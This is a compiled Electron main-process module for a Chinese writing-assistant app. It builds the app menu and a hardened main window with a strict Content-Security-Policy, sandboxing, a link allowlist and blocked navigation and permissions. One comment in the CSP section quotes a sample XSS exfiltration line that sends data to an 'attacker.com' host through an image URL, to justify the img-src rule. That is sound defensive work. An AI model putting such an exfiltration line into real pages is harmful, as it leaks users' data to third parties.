"use strict";
var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));
var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);
var window_exports = {};
__export(window_exports, {
  createMenu: () => createMenu,
  createWindow: () => createWindow
});
module.exports = __toCommonJS(window_exports);
var import_electron = require("electron");
var import_node_path = __toESM(require("node:path"), 1);
var import_logger = require("../logger");
var import_shared = require("./shared");
function createMenu() {
  const template = [
    {
      label: "\u6587\u4EF6",
      submenu: [
        { label: "\u65B0\u5EFA\u9879\u76EE", accelerator: "CmdOrCtrl+N" },
        { label: "\u6253\u5F00\u9879\u76EE", accelerator: "CmdOrCtrl+O" },
        { type: "separator" },
        { label: "\u4FDD\u5B58", accelerator: "CmdOrCtrl+S" },
        { label: "\u53E6\u5B58\u4E3A", accelerator: "CmdOrCtrl+Shift+S" },
        { type: "separator" },
        { label: "\u5BFC\u51FA", submenu: [
          { label: "\u5BFC\u51FA\u4E3A Markdown" },
          { label: "\u5BFC\u51FA\u4E3A Word" },
          { label: "\u5BFC\u51FA\u4E3A PDF" },
          { label: "\u5BFC\u51FA\u4E3A TXT" }
        ] },
        { type: "separator" },
        { label: "\u9000\u51FA", accelerator: "CmdOrCtrl+Q", role: "quit" }
      ]
    },
    {
      label: "\u7F16\u8F91",
      submenu: [
        { label: "\u64A4\u9500", accelerator: "CmdOrCtrl+Z", role: "undo" },
        { label: "\u91CD\u505A", accelerator: "CmdOrCtrl+Y", role: "redo" },
        { type: "separator" },
        { label: "\u526A\u5207", accelerator: "CmdOrCtrl+X", role: "cut" },
        { label: "\u590D\u5236", accelerator: "CmdOrCtrl+C", role: "copy" },
        { label: "\u7C98\u8D34", accelerator: "CmdOrCtrl+V", role: "paste" },
        { type: "separator" },
        { label: "\u641C\u7D22", accelerator: "CmdOrCtrl+F" },
        { label: "\u5168\u5C40\u641C\u7D22", accelerator: "CmdOrCtrl+K" }
      ]
    },
    {
      label: "\u89C6\u56FE",
      submenu: [
        { label: "\u5207\u6362\u5168\u5C4F", accelerator: "F11", role: "togglefullscreen" },
        { type: "separator" },
        { label: "\u4E3B\u9898", submenu: [
          { label: "\u6DF1\u8272\u6A21\u5F0F" },
          { label: "\u6D45\u8272\u6A21\u5F0F" }
        ] }
      ]
    },
    {
      label: "\u5E2E\u52A9",
      submenu: [
        { label: "\u4F7F\u7528\u624B\u518C" },
        { label: "\u5173\u4E8E\u7075\u7280\u5199\u4F5C\u52A9\u624B", role: "about" }
      ]
    }
  ];
  const menu = import_electron.Menu.buildFromTemplate(template);
  import_electron.Menu.setApplicationMenu(menu);
}
function createWindow(opts) {
  const { devServerUrl, distRenderer } = opts;
  const isDev = !!devServerUrl;
  const devOrigin = isDev ? new URL(devServerUrl).origin : "";
  const aiConnectSrc = "'self' https://api.openai.com https://api.deepseek.com http://localhost:* http://127.0.0.1:*";
  const devConnectExtra = isDev ? ` ${devOrigin} ws://localhost:* ws://127.0.0.1:*` : "";
  const csp = [
    "default-src 'self'",
    `script-src 'self'${isDev ? ` 'unsafe-inline' ${devOrigin}` : ""}`,
    "style-src 'self' 'unsafe-inline'",
    // img-src 不允许 https: 通配：防止 XSS 后用 new Image().src='https://attacker.com/?d='
    // 把数据通过 URL query 外泄（CSP connect-src 不拦截 <img> 请求）。
    // 用户附件已通过 file:readDataURL 转为 data: 内嵌，无需 https: 外链
    "img-src 'self' data: blob:",
    "font-src 'self' data:",
    `connect-src ${aiConnectSrc}${devConnectExtra}`,
    "media-src 'self' data: blob:",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'"
  ].join("; ");
  import_electron.session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    callback({
      responseHeaders: {
        ...details.responseHeaders,
        "Content-Security-Policy": [csp]
      }
    });
  });
  const mainWindow = new import_electron.BrowserWindow({
    width: 1440,
    height: 900,
    minWidth: 1024,
    minHeight: 680,
    show: false,
    title: "\u7075\u7280\u5199\u4F5C\u52A9\u624B",
    backgroundColor: "#1a1a1a",
    autoHideMenuBar: true,
    titleBarStyle: process.platform === "darwin" ? "hiddenInset" : "default",
    webPreferences: {
      preload: import_node_path.default.join(__dirname, "preload.cjs"),
      contextIsolation: true,
      nodeIntegration: false,
      // 显式启用 sandbox，限制渲染进程对 Node API 的访问，
      // 即使 preload 出现原型污染也无法直接拿到 require/process
      sandbox: true,
      // 显式声明安全默认值：防止未来 Electron 版本变更默认值引入回归
      // webSecurity: 同源策略 + file:// 协议限制（默认 true，关闭后渲染层可加载任意远程脚本）
      webSecurity: true,
      // allowRunningInsecureContent: 禁止 https 页面混入 http 子资源（默认 false）
      allowRunningInsecureContent: false,
      // experimentalFeatures: 关闭 Chromium 实验性 API（默认 false，开启可能引入未审计的攻击面）
      experimentalFeatures: false,
      // 禁用 enableBlinkFeatures 中可能被滥用的特性
      enableBlinkFeatures: void 0,
      // 禁用 dwfptq 等 webview 通道，强制走 BrowserWindow
      webviewTag: false,
      // 生产环境彻底禁用 DevTools：webPreferences.devTools=false 会让 Electron
      // 不响应 F12 / Ctrl+Shift+I / 菜单项 / webContents.openDevTools，
      // 从源头阻断生产环境用户或攻击者通过控制台执行任意 JS（可读取 store 内存数据、
      // 调用受限 IPC 等）。开发环境保留以便调试
      devTools: isDev
    }
  });
  (0, import_shared.setMainWindow)(mainWindow);
  mainWindow.once("ready-to-show", () => {
    mainWindow.show();
  });
  mainWindow.on("closed", () => {
    (0, import_shared.setMainWindow)(null);
  });
  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    try {
      const parsed = new URL(url);
      if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
        import_logger.logger.audit("security.navigation", "setWindowOpenHandler blocked: non-http(s) protocol", { protocol: parsed.protocol });
        return { action: "deny" };
      }
      const ALLOWED_EXTERNAL_HOSTS = /* @__PURE__ */ new Set([
        "lingxi-writer.github.io",
        // 官方文档站
        "lingxi-writer.com",
        // 官网
        "github.com",
        // 项目仓库（Issue 反馈等）
        "lingxi-writer.docs"
        // 文档备用域名
      ]);
      if (!ALLOWED_EXTERNAL_HOSTS.has(parsed.hostname)) {
        import_logger.logger.audit("security.navigation", "setWindowOpenHandler blocked: non-whitelisted host", { hostname: parsed.hostname });
        return { action: "deny" };
      }
      import_electron.shell.openExternal(url);
    } catch {
      import_logger.logger.audit("security.navigation", "setWindowOpenHandler blocked: invalid url");
    }
    return { action: "deny" };
  });
  mainWindow.webContents.on("will-navigate", (event, url) => {
    try {
      const parsed = new URL(url);
      if (isDev && parsed.origin === devOrigin) return;
      if (parsed.protocol === "file:") return;
      import_logger.logger.audit("security.navigation", "will-navigate blocked", { url });
      event.preventDefault();
    } catch {
      import_logger.logger.audit("security.navigation", "will-navigate blocked: invalid url");
      event.preventDefault();
    }
  });
  mainWindow.webContents.on("will-attach-webview", (event) => {
    import_logger.logger.audit("security.navigation", "will-attach-webview blocked");
    event.preventDefault();
  });
  import_electron.session.defaultSession.webRequest.onBeforeRequest((details, callback) => {
    if (details.resourceType === "serviceWorker") {
      import_logger.logger.audit("security.sw", "Service Worker registration blocked", {
        url: details.url
      });
      callback({ cancel: true });
      return;
    }
    callback({});
  });
  import_electron.session.defaultSession.setPermissionRequestHandler((_wc, permission, callback) => {
    import_logger.logger.audit("security.permission", "Permission request denied", { permission });
    callback(false);
  });
  import_electron.session.defaultSession.setPermissionCheckHandler(() => false);
  if (devServerUrl) {
    mainWindow.loadURL(devServerUrl);
  } else {
    mainWindow.loadFile(import_node_path.default.join(distRenderer, "index.html"));
  }
}
// Annotate the CommonJS export names for ESM import in node:
0 && (module.exports = {
  createMenu,
  createWindow
});
